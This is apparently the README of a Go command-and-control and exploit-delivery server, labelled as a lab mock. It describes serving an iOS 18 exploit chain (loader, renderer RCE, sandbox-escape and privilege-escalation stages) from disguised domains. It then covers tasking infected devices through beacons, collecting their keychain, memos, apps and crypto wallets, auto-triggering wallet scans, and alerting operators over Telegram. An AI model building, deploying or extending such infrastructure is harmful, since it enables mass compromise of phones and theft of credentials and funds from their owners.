# Mock C2 / 交付后端 —— Go 重构版

> 定位：受授权企业内部 DMZ/LAN 靶场（LAN 范围），模拟对齐预期使用的 C2 交付端 +
> 业务在线上形态。样本文件零嵌入本包，仅承载测试目的。
>
> 本目录是 `../boot-analysis`（Python / FastAPI 版）的 **Go 全量重构**：后端服务、
> 数据层、中间件、前端静态资源一一对应移植，行为对齐。原 Python 工程未被修改。

---

## 1. 目录结构（Python → Go 映射）

```
go/
├── main.go                          入口：CLI -> 自签证书 -> HTTP+HTTPS 双栈   (run.py)
├── go.mod / go.sum
├── run.bat / run.sh / mockc2_settings.example.json
├── www/                             静态资源统一根（交付 + 管理台）
│   ├── boot.html                    交付入口（HTML 壳，加载 boot.js）
│   ├── boot.js                      单链门禁（PE 锁/尝试窗口）+ iOS 18 约束 + 引导
│   ├── B10/*                        LIVE 链（iOS 18.4–18.7.2，唯一链路）
│   └── admin/                       浅色管理台静态（/admin）                 (backend/frontend/)
├── tools/
│   └── smoke9001.ps1                授权闭环冒烟回归（对齐 tools/smoke9001.py）
└── internal/
    ├── config/config.go             集中配置（默认 < json < env）            (c2mock/core/config.py)
    ├── store/
    │   ├── db.go                    MySQL 连接池 + 指标 + 批量写            (services/db.py)
    │   ├── schema.go                MySQL 基线 Schema + 版本化迁移（GET_LOCK 串行化）
    │   ├── fieldparser.go           按端点提炼字段（packet_meta 单源）       (services/fieldparser.py)
    │   ├── ingest.go                access/packets/probe/devices/command 落库 (services/ingest.py)
    │   ├── capture_store.go         请求体留存 + JSONL + 观察者              (services/capture_store.py)
    │   ├── chunk_store.go           分块归并/重组（/result 大文件）           (services/chunk_store.py)
    │   ├── notes_sink.go            备忘录解析 + db 落盘                      (services/notes_sink.py)
    │   ├── wallet_index.go          钱包规则映射 + wallet_seen 快照           (services/wallet_index.py)
    │   ├── asset_index.go           u/war 资产索引（JSONL，不入库）           (services/asset_index.py)
    │   ├── panel_query.go           看板 DB 聚合                             (services/panel_query.py)
    │   ├── query_api.go             只读查询面服务                            (services/query_api.py)
    │   ├── beacon_control.go        beacon 应答形态                          (services/beacon_control.py)
    │   ├── command_queue.go         指令队列 + command.json 持久化           (services/command_queue.py)
    │   └── security.go              门禁对齐（_x_pe_done cookie）             (core/security.py)
    └── server/
        ├── router.go                注册顺序路由（对齐 FastAPI 语义）
        ├── middleware.go            审计 / gzip 中间件                        (middleware/audit.py)
        ├── auth.go                  管理授权 + 内存会话                      (core/admin_auth.py)
        ├── app.go                   服务初始化 + 路由/中间件装配              (main.py)
        ├── delivery.go              交付域 catch-all + 根别名 + PE 锁 cookie  (routers/delivery.py)
        ├── sync.go                  sync 信标 / log.html sink                (routers/sync.py)
        ├── hq.go                    C2 簇 / HQ 簇 / war / l1res / __control   (routers/{c2,hq,l1res,ops}.py)
        ├── panel.go                 /panel/api/* + /panel/download + /console(302→/admin) (routers/panel.py)
        ├── feapi.go                 /api/* 兼容层                            (routers/feapi.py)
        ├── dash.go                  /__dash/api + /__dash/file（主数据口）    (routers/dash.py)
        ├── query.go                 /__q 只读查询面                          (routers/query.py)
        ├── metrics.go               /__metrics 运行指标（Prometheus 文本）
        └── admin.go                 /__auth/* + /admin                       (routers/admin.py)
```

---

## 2. 配置（装配优先级: 默认 < mockc2_settings.json < env）

| keys | 默认 | 说明 |
|---|---|---|
| `host` / `http_port` / `https_port` | 0.0.0.0 / 9001 / 9443 | 端口 |
| `admin_password` | `lab888` | **部署必改**（env `MOCKC2_ADMIN_PASSWORD`）|
| `admin_session_ttl` | 43200 | 后台会话 TTL（秒）|
| `ops_token` | 空 | 可选第二道 token（POST /__control）|
| `cache_control` | no-store | 控制链路缓存策略（`.js` 已分层 max-age=600）|
| `server_header` | nginx/1.22.0 | 交付域指纹 |
| `db_host` / `db_port` | 127.0.0.1 / 3306 | **MySQL/MariaDB 地址（部署必配）** |
| `db_user` / `db_password` / `db_name` | mockc2 / CHANGE-ME / mockc2 | 数据库账号（env `MOCKC2_DB_*`）|
| `db_max_open_conns` / `db_max_idle_conns` | 32 / 8 | 连接池上限 / 空闲连接 |
| `db_conn_max_lifetime` | 30 | 连接最长复用（分钟，避开 wait_timeout）|
| `db_params` | 空 | 附加 DSN 参数（`k=v&k2=v2`）|

`mockc2_settings.example.json` 任值拷贝成 `mockc2_settings.json` 或设 env `MOCKC2_*`。
项目根由 `MOCKC2_ROOT` 或当前工作目录决定（请在 `go/` 目录下运行）。

---

## 3. 构建与运行

> **前置：MySQL/MariaDB 8.0+/10.6+**（本项目企业级存储，SQLite 已移除）。
> 最快方式：`deploy/docker-compose.yml` 一键起 MySQL；或手动建库：
>
> ```sql
> CREATE DATABASE mockc2 CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
> CREATE USER 'mockc2'@'%' IDENTIFIED BY '<password>';
> GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,ALTER,INDEX,REFERENCES ON mockc2.* TO 'mockc2'@'%';
> ```
>
> 连接参数：`mockc2_settings.json` 的 `db_*` 键 或 env `MOCKC2_DB_*`。
> 服务启动时自动执行基线迁移（`schema_migrations` 版本表 + GET_LOCK 多实例互斥）。

```powershell
# 需要 Go 1.24+（开发使用 go1.27.1）
go build -o mockc2.exe .            # 或: go run .

.\mockc2.exe                        # HTTP :9001 + HTTPS :9443（自签证书自动生成）
.\mockc2.exe --no-https             # 仅 HTTP :9001（联调最快）
.\mockc2.exe --http-port 9101 --no-https
.\mockc2.exe --cert cert.pem --key key.pem --domain c2.lab --domain 192.168.1.10
```

- HTTPS 自签证书（CA + 服务器证书）由 `main.go` 用 `crypto/x509` 生成到 `certs/`
  （`ca.pem` / `ca.key` / `cert.pem` / `key.pem`），等价 Python 版的 openssl 流程。
- 真机接入：hosts/DNS 映射三个 `.icu` 域名 → 本机 LAN IP；HTTPS 信任 `certs/ca.pem`。

### 3.1 多实例 / 多 worker 横向扩展

Go 单进程本身已用满多核（goroutine 调度到全部 P），`--workers` 用于**进程级隔离 /
独立重启 / 跨机横向扩展**。父进程终结 TLS 并内置轮询 LB，子进程端口 = HTTP 端口 +1..+N：

```powershell
.\mockc2.exe --workers 4 --no-https        # LB :9100 -> workers :9101..:9104
.\mockc2.exe --workers 4                   # LB :9100/:9443 -> workers :9101..:9104
.\mockc2.exe --backends http://10.0.0.11:9100,http://10.0.0.12:9100   # 跨机后端，父进程仅做 LB
```

多实例一致性（进程内状态已外置，任意 worker 结果一致）：

| 状态 | 外置位置 | 说明 |
|---|---|---|
| 管理会话 | 无状态 HMAC 签名 token | 密钥 = `session_secret` 或由 `admin_password` 派生；任意节点可校验，无共享存储 |
| 指令队列 | MySQL `command_queue`（单行） | 任意实例武装，任意实例 beacon 原子领取（`FOR UPDATE` 行锁）|
| beacon 应答形态 | MySQL `kv` | 任意实例修改，全部实例生效 |
| 分块归并 | `capture/.parts/` + `chunks`/`files` 表 | part 落共享盘，O_EXCL 锁文件跨进程重组 |
| 访问/审计 | MySQL `access_log` + `capture/*.jsonl` | 共享库；审计异步批量多值 INSERT |
| 交付进度 | 由 `access_log` 派生（2s 缓存）| 任意 worker 查询一致 |

> 存储为 **MySQL/MariaDB**：写并发由 InnoDB 行锁 + 连接池承担，M 个实例共享同一库即可横向扩展；
> 领指令等原子读改写使用 `SELECT ... FOR UPDATE`，审计落库为单事务多值 INSERT（批量 < 200 行/批）。
> 连接池参数 `db_max_open_conns` / `db_max_idle_conns` / `db_conn_max_lifetime` 按实例调优。

### 3.2 CORS / OPTIONS 预检

交付链是跨域形态（boot.html 由交付域下发，POST 到 C2 域 `/api/ip-sync/sync`），
浏览器/WebView 会先发 `OPTIONS` 预检。服务端统一放行并回 CORS 头（`204`），
否则预检失败 → sync POST 不发出 → 设备不入库、看板不显示。

### 3.3 单链交付（只 iOS 18，无分流 / 无渠道）

- 入口：`www/boot.html`（HTML 壳）→ 加载 `www/boot.js`。
- `boot.js` 内含门禁（PE 锁 `_x_pe_done` TTL 10min + 尝试窗口 `_x_try ≤5/10min` + `?force=1`）
  与 **iOS 18-only 约束**（真机非 18.x 直接不跑，避免链不匹配导致卡死；非 iOS 桌面放行便于联调）。
- 单链目标在 `boot.js` 顶部一个常量：`var CHAIN = "/B10/rce_loader.js";`。
- **无分流**：不再有 A8（≤17.2）/ `c.html`（≥26）分支，交付 catch-all 未命中即 404。
- **无渠道**：入口登记载荷仅 `{deviceVersion, domain}`，设备台账已移除 `channel_code`（migration v6）。

---

## 4. 运维面入口（登录后）

| 面板 / API | 说明 |
|---|---|
| `POST /__auth/login {"password": …}` | 管理登录（HttpOnly 12h 滑动 TTL 会话） |
| `GET /admin` | 浅色单页后台（登录门 + 六面板） |
| `GET /console` | 302 → `/admin`（兼容入口；原双控制台导航页已随静态看板下线） |
| `GET /__dash/api` · `GET /__dash/file` | 主数据口 + 原始包读取（Vue 控制台唯一数据源） |
| `GET /__q/{commands,device_command_targets,device_commands}` | 只读查询面（收敛后仅指令队列） |
| `POST /__control` `{"type","params","once"}` | 指令武装；下一次 beacon 分发（`exit` 可终止） |
| `GET /panel/api/*` | 设备台账 / 进度 / 应用资产 / 钥匙串 / 备忘录 / 结果 / 来访 |
| `GET /panel/api/progress` | 交付进度百分比（按 client IP，含阶段权重表） |
| `GET /panel/download?ep&name` | 原始包下载（capture/ 白名单） |

受守卫前缀：`/__dash /__q /__control /__metrics /panel /api/{stats,data,file}`；`/admin` 与
`/__auth/login` 放行。

---

### 4.1 指令队列：按设备独立 + 批量异步（v7）

老模型 `command_queue` 是**单行全局队列**（id=1）：一条指令占住全局，任意设备领走才释放，
一台设备不心跳会阻塞后续所有指令。v7 新增 `device_commands` 表改为按设备独立 FIFO：

| 能力 | 接口 | 说明 |
|---|---|---|
| 批量武装 | `POST /__control {"type","params","once","targets":["uuid\|ip",…]}` | 每台各写一条独立记录，异步领取 |
| 单台武装 | `POST /__control {"type","params","once","target":"…"}` | 只由该身份的 beacon 领走 |
| 取消某台 | `POST /__control {"command":null,"target":"…"}` | armed→cancelled，其它设备不受影响 |
| 队列总览 | `GET /__q/device_command_targets` | `{target, armed, dispatched, total, last_armed_ts}` |
| 单台明细 | `GET /__q/device_commands?target=&limit=` | 该设备全部指令行（含 state/时间戳） |
| peek | `GET /__control` | 额外返回 `device_commands` 总览 |

- 领取优先级：`TakeFor([uuid, ip])` → 广播 `'*'` → 回落老的单行全局队列（完全兼容旧语义）
- `target='*'` 为广播：任一设备领一次（once 时领完即清）
- `command_id` 格式 `lab-<毫秒>-<PID>-<序号>`：批量下发跨 worker 不撞号
- 迁移只增 v7（新增表），不回改旧表

### 4.2 入库解析面的访问守卫

`/api/*` 兼容层（收敛后仅 `stats` / `data/photos` / `file`）属于敏感数据，已并入受守卫前缀：

```
/api/stats  /api/data  /api/file
```

交付链 `POST /api/ip-sync/sync` **不在**守卫列表内，保持免鉴权（否则设备不入库）。

### 4.3 Telegram bot（自管模块 · 命令版前端）

完全新增、可插拔模块：`internal/telegram`（**纯标准库，无第三方依赖**）。既是**事件推送**，
也是网页后台的**命令版前端**，并提供**窄口径 AI 问答**。

**自管配置**（不依赖 `internal/config`，模块可整体移除）：
- 文件：`telegram_settings.json`（见 `telegram_settings.example.json`；已 gitignore）
- env：`MOCKC2_TELEGRAM_{BOT_TOKEN,ENABLED,CHAT_IDS,EVENTS,ALLOW_CONTROL,POLL_TIMEOUT,RATE_MS}`
  与 `MOCKC2_LLM_{ENABLED,BASE_URL,API_KEY,MODEL,SYSTEM_PROMPT,TIMEOUT}`
- 运行时收紧：bot 内 `/set <key> <value>`（写共享 kv `telegram_cfg`，多实例 5s 内生效）
- `bot_token` 为空 → 模块静默不启动，不影响服务

**部署**：Telegram 长轮询 `getUpdates`（无需公网/HTTPS 回调）。@BotFather 建 bot 取 token；
`chat_ids` 填你的会话 ID（白名单，非白名单静默忽略）。

**命令版前端**（镜像网页各视图）：

| 命令 | 对应 |
|---|---|
| `/stats` | 仪表台 KPI |
| `/devices [n]` · `/device <uuid\|ip>` | 设备列表 / 详情（资产·钱包·回传文件） |
| `/progress` · `/access [n]` | 交付进度 / 访问统计 |
| `/wallets` `/keychain` `/memos` `/apps` `/results` | 数据视图 |
| `/commands` · `/peek` | 指令历史 / 队列 |
| `/arm` `/clear` | 指令控制（需 `allow_control=true`；`exit` 禁下发） |
| `/config` `/set` | 运行时配置查看 / 收紧 |
| 自然语言（非 `/` 开头）或 `/ai <问题>` | 大模型问答 |

**AI 口径（刻意收窄）**：不做工具调用、不读文件/代码、不暴露备忘录/应用/钥匙串明细、
无控制权；只依据后端注入的**受限快照**（KPI + 少量 Top，≤1.5KB）作答，快照没有的直接说没有。

**通知**：挂 `store.AddObserver` 钩子，按 `events` 白名单（默认 `beacon/a/war/result`）
推送到白名单会话；有界队列 + 限速，队列满丢弃，**绝不阻塞入库主链路**。

> 多实例注意：Telegram 长轮询是**独占**的——只在**一个**实例配置 `bot_token`，
> 否则多个实例抢 `getUpdates` 会互相 409。单实例部署无此问题。

### 4.4 命令编排（自管模块 · 事件驱动）

`internal/orchestrator`：**触发 → 条件 → 延迟 → 动作**。命中即向该设备队列 arm 一条指令
（下一发 beacon 领走）。配置：`orchestrator_settings.json`（见 `.example.json`，已 gitignore）
+ env `MOCKC2_ORCH_{ENABLED,MAX_PENDING}`。

**示例**（有钱包设备上线 → 等 3 分钟 → `wallet_scan`）：

```json
{
  "name": "wallet-online-scan",
  "enabled": true,
  "on": ["beacon"],
  "require_wallet": true,
  "delay_sec": 180,
  "cooldown_sec": 1800,
  "action": { "type": "wallet_scan", "params": {}, "once": true }
}
```

| 字段 | 含义 |
|---|---|
| `on` | 触发端点（取自入库观察者：`beacon`/`a`/`war`/`u`/`nb`/`result`…） |
| `require_wallet` | 条件：仅当该设备钱包数 > 0 |
| `delay_sec` | 延迟执行（秒） |
| `cooldown_sec` | 同 (规则,设备) 冷却（仅 `repeat=always` 有意义） |
| `repeat` | `once`（默认，每设备只执行一次）\| `always`（每次事件都触发） |
| `action` | 到点 arm 的指令（`type`/`params`/`once`） |

**状态机（幂等）**：每 `(规则, 设备)` 一条状态机，保证离线/上线不重跑：

```
[idle] --事件命中--> [scheduled] --延迟到点/arm--> [done]（终态）
                            ↑ repeat="always" 时回 [idle]
```

- `repeat="once"`（默认）：执行后进入 `done` 终态，**该设备后续上线不再触发**
- `repeat="always"`：执行后回 `idle`，下个事件可再触发（仍受 `cooldown_sec` 约束）
- 状态持久化到 kv `orch_state`，**重启不重放**；待执行任务存 kv `orch_pending`，按剩余时间恢复
- 复位：`/rule reset <name> [target]` 清除状态，使其可再次触发
- 审计：`capture/orchestrator.jsonl`（`scheduled` / `fired`）
- 安全：禁 `exit` 动作；待执行上限 `max_pending`

> 编排是**自动 arm**，实际执行仍由设备自己的 beacon 领走——设备不在线就排队等待，不会凭空"立刻执行"。

## 5. 指标 / 健康检查

- `GET /boot.html?c=1` → 200 = 交付态
- `GET /__dash/api`（未登录）= `{"error":"unauthorized"}` = 守卫健康
- `capture/access.jsonl` 任何增长 = 数据面健康
- `GET /__metrics`（登录后）→ Prometheus 文本：在途请求 / 背压快速失败 / DB 连接池 / GC / 审计丢弃
- `pprof` 本地诊断：`127.0.0.1:6060/debug/pprof/`（`--pprof-addr` 调整；故障免重启抓栈）

---

## 5.1 交付进度百分比

按设备（client IP）在交付链上到达的最远阶段折算进度，看板设备列表显示进度条，
接口 `GET /panel/api/progress`：

| 阶段 | 累计% | 区间增量% | 触发路径 |
|---|---|---|---|
| boot | 8 | 8 | `/boot.html` |
| loader | 18 | 10 | `/B10/rce_loader.js` |
| worker | 46 | 28 | `/B10/rce_worker_18.*.js` |
| sbx0 | 58 | 12 | `/sbx0_main_18.4.js` |
| sbx1 | 72 | 14 | `/sbx1_main.js` |
| pe | 86 | 14 | `/pe_worker.js` |
| beacon | 100 | 14 | `/beacon` |

- 数据来源：共享 `access_log`，多实例一致；无需设备端上报。
- 设备列表（`/panel/api/devices`、`/api/list?type=managed`）含 `progress` 与 `stage` 字段。
- 交付入口 `boot.html` / `group.html` 被访问即登记来访（手机访问无需等 sync POST 即入库）。

---

## 6. Linux 部署

```bash
# 1) 交叉编译（Windows/macOS 上直接出 Linux 静态二进制，无需目标机工具链）
make linux          # -> dist/mockc2-linux-amd64
make linux-arm64    # -> dist/mockc2-linux-arm64（ARM 服务器 / 树莓派）
make dist           # amd64 + arm64 + windows 全出

# 2) 本机试跑
./run.sh --no-https --http-port 9100              # 单实例
./run.sh --no-https --http-port 9100 --workers 4  # 多 worker + 内置 LB

# 3) 安装为 systemd 服务（装到 /opt/mockc2 并注册 mockc2.service）
sudo ./deploy/install.sh
systemctl status mockc2
journalctl -u mockc2 -f
```

- 二进制为**纯静态**（`CGO_ENABLED=0`；MySQL 驱动 `go-sql-driver/mysql` 为纯 Go，无 cgo），
  无 glibc 依赖，任意 Linux 发行版可直接运行（含 Alpine）。
- 运行态目录 `capture/`（留存）、`certs/`（自签证书）首次启动自动创建；**数据库在 MySQL**
  （无本地 `data/` 库文件）。systemd 以 `mockc2` 用户运行，`LimitNOFILE=65535`。
- 端口 HTTP 9100 / HTTPS 9443（>1024，无需 root；要绑 80/443 用 `AmbientCapabilities`
  或前置 nginx）。
- 多实例跨机：所有节点连**同一 MySQL 库** + 共享 `capture/`（建议 NFS/共享盘），
  且所有节点共享同一 `MOCKC2_SESSION_SECRET`（或相同 `admin_password`），或直接 `--backends` 指向它们。
- Docker 一键编排：`cd deploy && cp .env.example .env && docker compose up -d --build`。
- 前置 nginx：把三个 `*.icu` 域名与 `/` 全部 `proxy_pass http://127.0.0.1:9100`，
  **必须透传原始 `Host` 头**（服务端按 Host 分域；门禁 cookie 也依赖同源）。

**WSL(Ubuntu 24.04) 实测**（静态二进制）：

```
file mockc2 -> ELF 64-bit LSB executable, x86-64, statically linked, stripped
ldd  mockc2 -> not a dynamic executable
单实例 smoke 57/0 · 多 worker(4) smoke 57/0 · 跨 worker 会话/指令/分块重组 全部一致
```

发布包：`dist/mockc2-linux-amd64.tar.gz`（含二进制 + www + deploy + tools）。

---

## 7. 回归测试

```powershell
# 先启动服务（默认 9001）
.\mockc2.exe --no-https
# 另开终端
powershell -ExecutionPolicy Bypass -File tools\smoke9001.ps1
# 或指定端口
powershell -ExecutionPolicy Bypass -File tools\smoke9001.ps1 -Base http://127.0.0.1:9101
```

覆盖：交付链 12 项 + C2 簇 10 项 + 管理授权闭环 + 看板/查询/兼容层/指令控制台，
合计 59 项断言（全部 200/预期 401/404）。

---

## 8. 与 Python 版的行为对齐与差异说明

**完全对齐**
- 路由集合、响应形态（sync `{"code":200,"status":"ok"}`、log.html 200 空、beacon noop、result ok 等）
- 库内 Schema（20 张表）与全部索引；原始包只落 `capture/`，库内只存指针/指纹
- 分块归并（`(command_id, fname)` 聚合、10s 空闲重组、`capture/files/<sha256>-<name>`）
- 钱包规则 15 条与 `wallet_seen` 快照、`/war` 回传索引
- 门禁 `_x_pe_done` cookie（TTL 600s）、`.js` 分层缓存、PE 上线遥测
- 管理授权守卫与无状态签名会话（12h 滑动 TTL）、登录失败留痕
- gzip 压缩（≥2048B 且协商 gzip 时压缩大静态 JS）

**实现方式差异（不影响对外行为）**
- Web 框架：FastAPI/Starlette → 标准库 `net/http` + 自研顺序路由
- 存储：SQLite → **MySQL/MariaDB**（纯 Go 驱动、连接池、`FOR UPDATE` 原子领取、批量多值写）
- 自签证书：openssl 子进程 → `crypto/x509`
- 并发模型：SQLite 单写者（`SetMaxOpenConns(1)` + 全局写锁）→ MySQL 连接池（InnoDB 行锁）
- `fieldparser._meta_from_raw` 的 hex 分支：Python 版存在 `str(bytes).hex()` 的
  潜在异常（导致 raw 包不入库）；Go 版按**设计意图**正确 hex 化，故 raw/binary
  端点（heartbeat/ph）会正常进入 `packets` 索引。

---

## 9. 运维纪律

- 大回传不入库：正文只在 `capture/`，`wallet_seen / packets / files` 表只留指针
- 改表只增 migration 版本（基线 v1 固化），**不回改已发布版本**
- `tools/` 下的脚本为开发与回归使用，不要随部署暴露对外网
- 样本侧改动（`pe_worker.js` 补丁）与原 Python 工程一致，见 `../boot-analysis/backend/LAB_PATCH.md`

---

## 10. INC-2026-0929-001 故障修复对照（全部落地）

> 背景：低负载下 `/beacon` 全超时、CPU 打满 —— 根因是「热路径全量重算 + 无并发上限」的死亡螺旋。
> 修复不再基于 SQLite 打补丁，随本次 **MySQL 企业化迁移**一并根治。

| 报告项 | 修复 | 落点 |
|---|---|---|
| §6.1 消除热路径全量重算 | `/beacon` 领取不再调用 `ListDevices()`（8+ 次全量聚合），改用轻量 `uuid/lhu↔ip` 单查询映射 | `store/command_queue.go` `deviceIdentityPairs()` |
| §6.2 并发上限（止血） | `expandCands` 信号量硬上限 16 + 2s 快速失败（宁退化候选集也不堆积） | `command_queue.go` `expandSem` |
| §6.3 候选集缓存 | 身份映射 2s TTL + 回源互斥（等价 singleflight）；`ClientStageProgress` 全表聚合 2s 缓存 | `command_queue.go` / `stage_progress.go` |
| §6.4 锁粒度 | 全局单例改 `RWMutex`（读路径 RLock） | `db.go` / `command_queue.go` / `beacon_control.go` |
| §6.5 nginx 背压 | **未动 nginx**（用户约束）；背压已由应用层信号量实现 | — |
| §6.6 审计批量化 | 审计异步队列 + 单事务多值 INSERT（批量 200/批）；队列满丢弃计数不阻塞 | `db.go Many()` / `middleware.go` |
| §6.7 pprof + 指标 | `--pprof-addr`（默认 127.0.0.1:6060）免重启抓栈；`/__metrics` Prometheus 文本 | `main.go` / `server/metrics.go` |
| §6.8 有界内存 | 审计队列 65536 上限、丢弃可观测；分批写有界 | `middleware.go` |
| 验收 §8 | `FOR UPDATE` 原子领取、连接池并发、WAL/单写者问题随 SQLite 移除整体消失 | 全量 |

**新增可观测指标**（`/__metrics`，登录后）：`in_flight_requests`、`expand_fastfail_total`、
`idmap_reload_total`、`db_queries_total`、`db_wait_count`、`audit_dropped_total`、GC/goroutine/uptime。

**压测建议**（复现报告 §8-10 的 76+ 并发水位）：

```powershell
go run ./cmd/loadtest -base http://127.0.0.1:9100 -c 100 -n 20000
```
